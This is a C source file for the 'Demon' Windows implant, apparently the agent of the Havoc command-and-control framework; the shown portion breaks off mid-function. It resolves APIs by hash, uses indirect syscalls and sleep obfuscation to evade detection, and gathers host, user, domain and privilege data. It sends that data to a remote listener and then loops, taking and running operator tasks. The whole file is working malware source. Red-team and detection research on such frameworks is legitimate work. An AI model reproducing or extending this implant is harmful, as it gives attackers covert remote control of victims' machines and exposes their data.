#include <Demon.h>

/* Import Common Headers */
#include <Common/Defines.h>
#include <Common/Macros.h>

/* Import Core Headers */
#include <Core/Transport.h>
#include <Core/SleepObf.h>
#include <Core/Win32.h>
#include <Core/MiniStd.h>
#include <Core/SysNative.h>
#include <Core/Runtime.h>

/* Import Inject Headers */
#include <Inject/Inject.h>

/* Import Inject Headers */
#include <Loader/ObjectApi.h>

/* Global Variables */
SEC_DATA INSTANCE Instance      = { 0 };
SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES;

/*
 * In DemonMain it should go as followed:
 *
 * 1. Initialize pointer, modules and win32 api
 * 2. Initialize metadata
 * 3. Parse config
 * 4. Enter main connecting and tasking routine
 *
 */
VOID DemonMain( PVOID ModuleInst, PKAYN_ARGS KArgs )
{
    /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
    DemonInit( ModuleInst, KArgs );

    /* Initialize MetaData */
    DemonMetaData( &Instance.MetaData, TRUE );

    /* Main demon routine */
    DemonRoutine();
}

/* Main demon routine:
 *
 * 1. Connect to listener
 * 2. Go into tasking routine:
 *      A. Sleep Obfuscation.
 *      B. Request for the task queue
 *      C. Parse Task
 *      D. Execute Task (if it's not DEMON_COMMAND_NO_JOB)
 *      E. Goto C (we do this til there is nothing left)
 *      F. Goto A (we have nothing else to execute then lets sleep and after waking up request for more)
 * 3. Sleep Obfuscation. After that lets try to connect to the listener again
 */
_Noreturn
VOID DemonRoutine()
{
    /* the main loop */
    for ( ;; )
    {
        /* if we aren't connected then lets connect to our host */
        if ( ! Instance.Session.Connected )
        {
            /* Connect to our listener */
            if ( TransportInit() )
            {

#ifdef TRANSPORT_HTTP
                /* reset the failure counter since we managed to connect to it. */
                Instance.Config.Transport.Host->Failures = 0;
#endif
            }
        }

        if ( Instance.Session.Connected )
        {
            /* Enter tasking routine */
            CommandDispatcher();
        }

        /* Sleep for a while (with encryption if specified) */
        SleepObf();
    }
}

/* Init metadata buffer/package. */
VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
{
    PVOID            Data       = NULL;
    PIP_ADAPTER_INFO Adapter    = NULL;
    OSVERSIONINFOEXW OsVersions = { 0 };
    SIZE_T           Length     = 0;
    DWORD            dwLength   = 0;

    /* Check we if we want to add the Agent Header + CommandID too */
    if ( Header )
    {
        *MetaData = PackageCreateWithMetaData( DEMON_INITIALIZE );

        /* Do not destroy this package if we fail to connect to the listener. */
        ( *MetaData )->Destroy = FALSE;
    }

    // create AES Keys/IV
    if ( Instance.Config.AES.Key == NULL && Instance.Config.AES.IV == NULL )
    {
        Instance.Config.AES.Key = Instance.Win32.LocalAlloc( LPTR, 32 );
        Instance.Config.AES.IV  = Instance.Win32.LocalAlloc( LPTR, 16 );

        for ( SHORT i = 0; i < 32; i++ )
            Instance.Config.AES.Key[ i ] = RandomNumber32();

        for ( SHORT i = 0; i < 16; i++ )
            Instance.Config.AES.IV[ i ]  = RandomNumber32();
    }

    /*

     Header (if specified):
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes
        [ Request ID   ] 4 bytes

     MetaData:
        [ AES KEY      ] 32 bytes
        [ AES IV       ] 16 bytes
        [ Magic Value  ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ Host Name    ] size + bytes
        [ User Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ Base Address ] 8 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
        [ SleepDelay   ] 4 bytes
        [ SleepJitter  ] 4 bytes
        [ Killdate     ] 8 bytes
        [ WorkingHours ] 4 bytes
        ..... more
        [ Optional     ] Eg: Pivots, Extra data about the host or network etc.
    */

    // Add AES Keys/IV
    PackageAddPad( *MetaData, ( PCHAR ) Instance.Config.AES.Key, 32 );
    PackageAddPad( *MetaData, ( PCHAR ) Instance.Config.AES.IV,  16 );

    // Add session id
    PackageAddInt32( *MetaData, Instance.Session.AgentID );

    // Get Computer name
    dwLength = 0;
    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &dwLength ) )
    {
        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            MemSet( Data, 0, dwLength );
            if ( Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &dwLength ) )
                PackageAddBytes( *MetaData, Data, dwLength );
            else
                PackageAddInt32( *MetaData, 0 );
            DATA_FREE( Data, dwLength );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get Username
    dwLength = 0;
    if ( ! Instance.Win32.GetUserNameA( NULL, &dwLength ) )
    {
        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            MemSet( Data, 0, dwLength );
            if ( Instance.Win32.GetUserNameA( Data, &dwLength ) )
                PackageAddBytes( *MetaData, Data, dwLength );
            else
                PackageAddInt32( *MetaData, 0 );
            DATA_FREE( Data, dwLength );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get Domain
    dwLength = 0;
    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &dwLength ) )
    {
        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            MemSet( Data, 0, dwLength );
            if ( Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &dwLength ) )
                PackageAddBytes( *MetaData, Data, dwLength );
            else
                PackageAddInt32( *MetaData, 0 );
            DATA_FREE( Data, dwLength );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get internal IP
    dwLength = 0;
    if ( Instance.Win32.GetAdaptersInfo( NULL, &dwLength ) )
    {
        if ( ( Adapter = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            if ( Instance.Win32.GetAdaptersInfo( Adapter, &dwLength ) == NO_ERROR )
                PackageAddString( *MetaData, Adapter->IpAddressList.IpAddress.String );
            else
                PackageAddInt32( *MetaData, 0 );
            DATA_FREE( Adapter, dwLength );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get Process Path
    PackageAddWString( *MetaData, ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Buffer );

    PackageAddInt32( *MetaData, ( DWORD ) ( ULONG_PTR ) Instance.Teb->ClientId.UniqueProcess );
    PackageAddInt32( *MetaData, ( DWORD ) ( ULONG_PTR ) Instance.Teb->ClientId.UniqueThread );
    PackageAddInt32( *MetaData, Instance.Session.PPID );
    PackageAddInt32( *MetaData, PROCESS_AGENT_ARCH );
    PackageAddInt32( *MetaData, BeaconIsAdmin( ) );
    PackageAddInt64( *MetaData, Instance.Session.ModuleBase );

    MemSet( &OsVersions, 0, sizeof( OsVersions ) );
    OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
    Instance.Win32.RtlGetVersion( &OsVersions );
    PackageAddInt32( *MetaData, OsVersions.dwMajorVersion );
    PackageAddInt32( *MetaData, OsVersions.dwMinorVersion );
    PackageAddInt32( *MetaData, OsVersions.wProductType );
    PackageAddInt32( *MetaData, OsVersions.wServicePackMajor );
    PackageAddInt32( *MetaData, OsVersions.dwBuildNumber );
    PackageAddInt32( *MetaData, Instance.Session.OS_Arch );

    PackageAddInt32( *MetaData, Instance.Config.Sleeping );
    PackageAddInt32( *MetaData, Instance.Config.Jitter );
    PackageAddInt64( *MetaData, Instance.Config.Transport.KillDate );
    PackageAddInt32( *MetaData, Instance.Config.Transport.WorkingHours );
}

VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
{
    OSVERSIONINFOEXW             OSVersionExW     = { 0 };
    PVOID                        RtModules[]      = {
            RtAdvapi32,
            RtMscoree,
            RtOleaut32,
            RtUser32,
            RtShell32,
            RtMsvcrt,
            RtIphlpapi,
            RtGdi32,
            RtNetApi32,
            RtWs2_32,
            RtSspicli,
#ifdef TRANSPORT_HTTP
            RtWinHttp,
#endif
    };

    MemSet( &Instance, 0, sizeof( INSTANCE ) );

    Instance.Teb = NtCurrentTeb();

#ifdef TRANSPORT_HTTP
    PUTS( "TRANSPORT_HTTP" )
#endif

#ifdef TRANSPORT_SMB
    PUTS( "TRANSPORT_SMB" )
#endif


    /* resolve ntdll.dll functions */
    if ( ( Instance.Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {
        /* Module/Address function loading */
        Instance.Win32.LdrGetProcedureAddress            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_LDRGETPROCEDUREADDRESS );
        Instance.Win32.LdrLoadDll                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_LDRLOADDLL );

        /* Rtl functions */
        Instance.Win32.RtlAllocateHeap                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLALLOCATEHEAP );
        Instance.Win32.RtlReAllocateHeap                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLREALLOCATEHEAP );
        Instance.Win32.RtlFreeHeap                       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLFREEHEAP );
        Instance.Win32.RtlExitUserThread                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLEXITUSERTHREAD );
        Instance.Win32.RtlExitUserProcess                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLEXITUSERPROCESS );
        Instance.Win32.RtlRandomEx                       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLRANDOMEX );
        Instance.Win32.RtlNtStatusToDosError             = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLNTSTATUSTODOSERROR );
        Instance.Win32.RtlGetVersion                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLGETVERSION );
        Instance.Win32.RtlCreateTimerQueue               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCREATETIMERQUEUE );
        Instance.Win32.RtlCreateTimer                    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCREATETIMER );
        Instance.Win32.RtlQueueWorkItem                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLQUEUEWORKITEM );
        Instance.Win32.RtlRegisterWait                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLREGISTERWAIT );
        Instance.Win32.RtlDeleteTimerQueue               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLDELETETIMERQUEUE );
        Instance.Win32.RtlCaptureContext                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCAPTURECONTEXT );
        Instance.Win32.RtlAddVectoredExceptionHandler    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER );
        Instance.Win32.RtlRemoveVectoredExceptionHandler = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER );
        Instance.Win32.RtlCopyMappedMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCOPYMAPPEDMEMORY );

        /* Native functions */
        Instance.Win32.NtClose                           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCLOSE );
        Instance.Win32.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATEEVENT );
        Instance.Win32.NtSetEvent                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETEVENT );
        Instance.Win32.NtSetInformationThread            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETINFORMATIONTHREAD );
        Instance.Win32.NtSetInformationVirtualMemory     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETINFORMATIONVIRTUALMEMORY );
        Instance.Win32.NtGetNextThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTGETNEXTTHREAD );
        Instance.Win32.NtOpenProcess                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENPROCESS );
        Instance.Win32.NtTerminateProcess                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTERMINATEPROCESS );
        Instance.Win32.NtQueryInformationProcess         = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONPROCESS );
        Instance.Win32.NtQuerySystemInformation          = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYSYSTEMINFORMATION );
        Instance.Win32.NtAllocateVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTALLOCATEVIRTUALMEMORY );
        Instance.Win32.NtQueueApcThread                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUEUEAPCTHREAD );
        Instance.Win32.NtOpenThread                      = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENTHREAD );
        Instance.Win32.NtOpenThreadToken                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENTHREADTOKEN );
        Instance.Win32.NtResumeThread                    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTRESUMETHREAD );
        Instance.Win32.NtSuspendThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSUSPENDTHREAD );
        Instance.Win32.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATEEVENT );
        Instance.Win32.NtDuplicateObject                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTDUPLICATEOBJECT );
        Instance.Win32.NtGetContextThread                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTGETCONTEXTTHREAD );
        Instance.Win32.NtSetContextThread                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETCONTEXTTHREAD );
        Instance.Win32.NtWaitForSingleObject             = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTWAITFORSINGLEOBJECT );
        Instance.Win32.NtAlertResumeThread               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTALERTRESUMETHREAD );
        Instance.Win32.NtSignalAndWaitForSingleObject    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT );
        Instance.Win32.NtTestAlert                       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTESTALERT );
        Instance.Win32.NtCreateThreadEx                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATETHREADEX );
        Instance.Win32.NtOpenProcessToken                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENPROCESSTOKEN );
        Instance.Win32.NtDuplicateToken                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTDUPLICATETOKEN );
        Instance.Win32.NtProtectVirtualMemory            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTPROTECTVIRTUALMEMORY  );
        Instance.Win32.NtTerminateThread                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTERMINATETHREAD );
        Instance.Win32.NtWriteVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTWRITEVIRTUALMEMORY );
        Instance.Win32.NtContinue                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCONTINUE );
        Instance.Win32.NtReadVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTREADVIRTUALMEMORY );
        Instance.Win32.NtFreeVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTFREEVIRTUALMEMORY );
        Instance.Win32.NtUnmapViewOfSection              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTUNMAPVIEWOFSECTION );
        Instance.Win32.NtQueryVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYVIRTUALMEMORY );
        Instance.Win32.NtQueryInformationToken           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTOKEN );
        Instance.Win32.NtQueryInformationThread          = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
        Instance.Win32.NtQueryObject                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
        Instance.Win32.NtTraceEvent                      = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTRACEEVENT );
    } else {
        PUTS( "Failed to load ntdll from PEB" )
        return;
    }

    /* resolve Windows version */
    Instance.Session.OSVersion = WIN_VERSION_UNKNOWN;
    OSVersionExW.dwOSVersionInfoSize = sizeof( OSVersionExW );
    if ( NT_SUCCESS( Instance.Win32.RtlGetVersion( &OSVersionExW ) ) ) {
        if ( OSVersionExW.dwMajorVersion >= 5 ) {
            if ( OSVersionExW.dwMajorVersion == 5 ) {
                if ( OSVersionExW.dwMinorVersion == 1 ) {
                    Instance.Session.OSVersion = WIN_VERSION_XP;
                }
            } else if ( OSVersionExW.dwMajorVersion == 6 ) {
                if ( OSVersionExW.dwMinorVersion == 0 ) {
                    Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_VISTA : WIN_VERSION_2008;
                } else if ( OSVersionExW.dwMinorVersion == 1 ) {
                    Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_7 : WIN_VERSION_2008_R2;
                } else if ( OSVersionExW.dwMinorVersion == 2 ) {
                    Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8 : WIN_VERSION_2012;
                } else if ( OSVersionExW.dwMinorVersion == 3 ) {
                    Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8_1 : WIN_VERSION_2012_R2;
                }
            } else if ( OSVersionExW.dwMajorVersion == 10 ) {
                if ( OSVersionExW.dwMinorVersion == 0 ) {
                    Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_10 : WIN_VERSION_2016_X;
                }
            }
        }
    } PRINTF( "OSVersion: %d\n", Instance.Session.OSVersion );

    /* load kernel32.dll functions */
    if ( ( Instance.Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
        Instance.Win32.LoadLibraryW                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOADLIBRARYW );
        Instance.Win32.VirtualProtectEx                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_VIRTUALPROTECTEX );
        Instance.Win32.VirtualProtect                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_VIRTUALPROTECT );
        Instance.Win32.LocalAlloc                      = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOCALALLOC );
        Instance.Win32.LocalReAlloc                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOCALREALLOC );
        Instance.Win32.LocalFree                       = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOCALFREE );
        Instance.Win32.CreateRemoteThread              = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEREMOTETHREAD );
        Instance.Win32.CreateToolhelp32Snapshot        = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATETOOLHELP32SNAPSHOT );
        Instance.Win32.Process32FirstW                 = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_PROCESS32FIRSTW );
        Instance.Win32.Process32NextW                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_PROCESS32NEXTW );
        Instance.Win32.CreatePipe                      = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEPIPE );
        Instance.Win32.CreateProcessW                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEPROCESSW );
        Instance.Win32.GetFullPathNameW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETFULLPATHNAMEW );
        Instance.Win32.CreateFileW                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEFILEW );
        Instance.Win32.GetFileSize                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETFILESIZE );
        Instance.Win32.GetFileSizeEx                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETFILESIZEEX );
        Instance.Win32.CreateNamedPipeW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATENAMEDPIPEW );
        Instance.Win32.ConvertFiberToThread            = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CONVERTFIBERTOTHREAD );
        Instance.Win32.CreateFiberEx                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEFIBEREX );
        Instance.Win32.ReadFile                        = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_READFILE );
        Instance.Win32.VirtualAllocEx                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_VIRTUALALLOCEX );
        Instance.Win32.WaitForSingleObjectEx           = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WAITFORSINGLEOBJECTEX );
        Instance.Win32.GetComputerNameExA              = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETCOMPUTERNAMEEXA );
        Instance.Win32.GetExitCodeProcess              = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETEXITCODEPROCESS );
        Instance.Win32.GetExitCodeThread               = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETEXITCODETHREAD );
        Instance.Win32.TerminateProcess                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_TERMINATEPROCESS );
        Instance.Win32.ConvertThreadToFiberEx          = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CONVERTTHREADTOFIBEREX );
        Instance.Win32.SwitchToFiber                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_SWITCHTOFIBER );
        Instance.Win32.DeleteFiber                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DELETEFIBER );
        Instance.Win32.AllocConsole                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_ALLOCCONSOLE );
        Instance.Win32.FreeConsole                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FREECONSOLE );
        Instance.Win32.GetConsoleWindow                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETCONSOLEWINDOW );
        Instance.Win32.GetStdHandle                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETSTDHANDLE );
        Instance.Win32.SetStdHandle                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_SETSTDHANDLE );
        Instance.Win32.WaitNamedPipeW                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WAITNAMEDPIPEW  );
        Instance.Win32.PeekNamedPipe                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_PEEKNAMEDPIPE );
        Instance.Win32.DisconnectNamedPipe             = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DISCONNECTNAMEDPIPE );
        Instance.Win32.WriteFile                       = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WRITEFILE );
        Instance.Win32.ConnectNamedPipe                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CONNECTNAMEDPIPE );
        Instance.Win32.FreeLibrary                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FREELIBRARY );
        Instance.Win32.GetCurrentDirectoryW            = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETCURRENTDIRECTORYW );
        Instance.Win32.GetFileAttributesW              = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETFILEATTRIBUTESW );
        Instance.Win32.FindFirstFileW                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FINDFIRSTFILEW );
        Instance.Win32.FindNextFileW                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FINDNEXTFILEW );
        Instance.Win32.FindClose                       = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FINDCLOSE );
        Instance.Win32.FileTimeToSystemTime            = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FILETIMETOSYSTEMTIME );
        Instance.Win32.SystemTimeToTzSpecificLocalTime = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_SYSTEMTIMETOTZSPECIFICLOCALTIME );
        Instance.Win32.RemoveDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_REMOVEDIRECTORYW );
        Instance.Win32.DeleteFileW                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DELETEFILEW );
        Instance.Win32.CreateDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEDIRECTORYW );
        Instance.Win32.CopyFileW                       = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_COPYFILEW );
        Instance.Win32.SetCurrentDirectoryW            = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_SETCURRENTDIRECTORYW );
        Instance.Win32.Wow64DisableWow64FsRedirection  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WOW64DISABLEWOW64FSREDIRECTION );
        Instance.Win32.Wow64RevertWow64FsRedirection   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WOW64REVERTWOW64FSREDIRECTION );
        Instance.Win32.GetModuleHandleA                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETMODULEHANDLEA );
        Instance.Win32.GetSystemTimeAsFileTime         = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETSYSTEMTIMEASFILETIME );
        Instance.Win32.GetLocalTime                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETLOCALTIME );
        Instance.Win32.DuplicateHandle                 = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DUPLICATEHANDLE );
        Instance.Win32.AttachConsole                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_ATTACHCONSOLE );
        Instance.Win32.WriteConsoleA                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WRITECONSOLEA );
        Instance.Win32.GlobalFree                      = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GLOBALFREE );
    }

    /* now that we loaded some of the basic apis lets parse the config and see how we load the rest */
    /* Parse config */
    DemonConfig();

    /* now do post init stuff after parsing the config */
    if ( Instance.Config.Implant.SysIndirect )
    {
        /* Initialize indirect syscalls + get SSN from every single syscall we need */
        if  ( ! SysInitialize( Instance.Modules.Ntdll ) ) {
            PUTS( "Failed to Initialize syscalls" )
            /* NOTE: the agent is going to keep going for now. */
        }
    }

    /* shuffle array */
    ShuffleArray( RtModules, SIZEOF_ARRAY( RtModules ) );

    /* load all modules */
    for ( int i = 0; i < SIZEOF_ARRAY( RtModules ); i++ )
    {
        /* load module */
        if ( ! ( ( BOOL (*)() ) RtModules[ i ] ) () ) {
            PUTS( "Failed to load a module" )
            return;
        }
    }

    if ( KArgs )
    {
#if SHELLCODE
        Instance.Session.ModuleBase = KArgs->Demon;
        Instance.Session.ModuleSize = KArgs->DemonSize;
        Instance.Session.TxtBase = KArgs->TxtBase;
        Instance.Session.TxtSize = KArgs->TxtSize;
        FreeReflectiveLoader( KArgs->KaynLdr );
#endif
    }
    else
    {
        Instance.Session.ModuleBase = ModuleInst;

        /* if ModuleBase has not been specified then lets use the current process one */
        if ( ! Instance.Session.ModuleBase ) {
            /* if we specified nothing as our ModuleBase then this either means that we are an exe or we should use the whole process */
            Instance.Session.ModuleBase = LdrModulePeb( 0 );
        }

        if ( Instance.Session.ModuleBase ) {
            Instance.Session.ModuleSize = IMAGE_SIZE( Instance.Session.ModuleBase );
        }
    }

#if _WIN64
    Instance.Session.OS_Arch      = PROCESSOR_ARCHITECTURE_AMD64;
    Instance.Session.Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
#else
    Instance.Session.Process_Arch = PROCESSOR_ARCHITECTURE_INTEL;
    Instance.Session.OS_Arch      = PROCESSOR_ARCHITECTURE_UNKNOWN;
    if ( ProcessIsWow( NtCurrentProcess() ) ) {
        Instance.Session.OS_Arch  = PROCESSOR_ARCHITECTURE_AMD64;
    } else {
        Instance.Session.OS_Arch  = PROCESSOR_ARCHITECTURE_INTEL;
    }
#endif

    Instance.Session.PID       = U_PTR( Instance.Teb->ClientId.UniqueProcess );
    Instance.Session.TID       = U_PTR( Instance.Teb->ClientId.UniqueThread );
    Instance.Session.Connected = FALSE;
    Instance.Session.AgentID   = RandomNumber32();
    Instance.Config.AES.Key    = NULL; /* TODO: generate keys here  */
    Instance.Config.AES.IV     = NULL;

    /* Linked lists */
    Instance.Tokens.Vault       = NULL;
    Instance.Tokens.Impersonate = FALSE;
    Instance.Jobs               = NULL;
    Instance.Downloads          = NULL;
    Instance.Sockets            = NULL;
    Instance.HwBpEngine         = NULL;
    Instance.Packages           = NULL;

    /* Global Objects */
    Instance.Dotnet = NULL;

    /* if cfg is enforced (and if sleep obf is enabled)
     * add every address we're going to use to the Cfg address list
     * to not raise an exception while performing sleep obfuscation */
    if ( CfgQueryEnforced() )
    {
        PUTS( "Adding required function module &addresses to the cfg list"  );

        /* common functions */
